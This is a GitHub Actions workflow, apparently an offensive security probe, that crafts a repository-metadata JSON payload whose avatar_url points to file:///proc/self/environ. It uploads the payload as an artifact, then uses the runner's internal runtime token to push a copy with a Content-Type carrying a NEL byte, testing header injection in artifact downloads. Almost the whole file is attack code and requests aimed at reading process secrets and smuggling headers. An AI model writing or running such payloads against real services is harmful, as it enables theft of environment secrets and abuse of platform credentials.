name: Artifact CT Test
on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Create payload
        run: |
          # JSON payload matching what Node.js JSON.stringify produces
          python3 -c "
          import json
          payload = json.dumps({
            'full_name': 'RWeng77/rc-test/actions/artifacts/PLACEHOLDER/zip',
            'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
            'description': 'Repo Cassette postcard',
            'stargazers_count': 42
          }, separators=(',', ':'))
          with open('payload.json', 'w') as f:
            f.write(payload)
          print('SHA256:', __import__('hashlib').sha256(payload.encode()).hexdigest())
          print('Size:', len(payload))
          print('Content:', payload[:200])
          "

      - name: Upload standard artifact
        uses: actions/upload-artifact@v4
        with:
          name: test-standard
          path: payload.json
          retention-days: 1

      - name: Get artifact ID and test download
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          sleep 3
          echo "=== List artifacts ==="
          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes, archive_download_url}'
          
          ARTIFACT_ID=$(echo "$ARTIFACTS" | jq -r '.artifacts[0].id')
          echo "ARTIFACT_ID=$ARTIFACT_ID"
          
          echo ""
          echo "=== Download - check redirect URL ==="
          curl -sD- -o /dev/null \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$ARTIFACT_ID/zip" 2>&1 | head -20
          
          echo ""
          echo "=== Follow redirect - check final headers ==="
          REDIRECT_URL=$(curl -s -o /dev/null -w "%{redirect_url}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$ARTIFACT_ID/zip")
          echo "Redirect URL (trimmed): ${REDIRECT_URL:0:200}"
          echo "Has rsct: $(echo $REDIRECT_URL | grep -o 'rsct=[^&]*' || echo 'NO RSCT')"
          
          echo ""
          echo "=== Final response headers ==="
          curl -sI "$REDIRECT_URL" | head -20

      - name: Try direct Azure upload with custom CT
        run: |
          echo "=== Testing direct artifact upload with custom CT ==="
          
          # Get the backend URLs
          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
          
          # Create artifact via v4 API
          CREATE_RESP=$(curl -s -X POST \
            "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"workflow_run_backend_id\":\"$(echo $ACTIONS_RUNTIME_URL | grep -oP '[^/]+$')\",\"workflow_job_run_backend_id\":\"$GITHUB_JOB\",\"name\":\"test-custom-ct\",\"version\":4}")
          echo "Create response: $CREATE_RESP"
          
          UPLOAD_URL=$(echo "$CREATE_RESP" | jq -r '.signed_upload_url // empty')
          if [ -n "$UPLOAD_URL" ]; then
            echo "Got upload URL (trimmed): ${UPLOAD_URL:0:150}..."
            
            # Upload with custom Content-Type containing NEL byte
            python3 -c "
          import json, urllib.request
          payload = json.dumps({
            'full_name': 'RWeng77/rc-test',
            'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
            'description': 'Repo Cassette postcard',
            'stargazers_count': 42
          }, separators=(',', ':'))
          
          # Upload with CT containing NEL
          ct = 'application/json…'
          req = urllib.request.Request('$UPLOAD_URL', data=payload.encode(), method='PUT')
          req.add_header('Content-Type', ct)
          req.add_header('x-ms-blob-type', 'BlockBlob')
          try:
            resp = urllib.request.urlopen(req)
            print('Upload status:', resp.status)
            print('Upload headers:', dict(resp.headers))
          except Exception as e:
            print('Upload error:', e)
            if hasattr(e, 'read'):
              print('Body:', e.read()[:500])
          "
            
            # Finalize
            FINALIZE_RESP=$(curl -s -X POST \
              "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
              -H "Content-Type: application/json" \
              -d "{\"workflow_run_backend_id\":\"$(echo $ACTIONS_RUNTIME_URL | grep -oP '[^/]+$')\",\"workflow_job_run_backend_id\":\"$GITHUB_JOB\",\"name\":\"test-custom-ct\",\"size\":\"$(wc -c < payload.json)\"}")
            echo "Finalize response: $FINALIZE_RESP"
            
            sleep 3
            
            # Now check download of custom artifact
            ARTIFACTS2=$(curl -s -H "Authorization: token $GH_TOKEN" \
              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
            echo "All artifacts: $(echo $ARTIFACTS2 | jq '.artifacts[] | {id, name}')"
            
            CUSTOM_ID=$(echo $ARTIFACTS2 | jq -r '.artifacts[] | select(.name=="test-custom-ct") | .id')
            if [ -n "$CUSTOM_ID" ]; then
              echo "Custom artifact ID: $CUSTOM_ID"
              REDIRECT2=$(curl -s -o /dev/null -w "%{redirect_url}" \
                -H "Authorization: token $GH_TOKEN" \
                "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$CUSTOM_ID/zip")
              echo "Custom redirect rsct: $(echo $REDIRECT2 | grep -o 'rsct=[^&]*' || echo 'NO RSCT')"
              echo "Custom final headers:"
              curl -sI "$REDIRECT2" | grep -i content-type
            fi
          else
            echo "No upload URL - try alternate API"
          fi
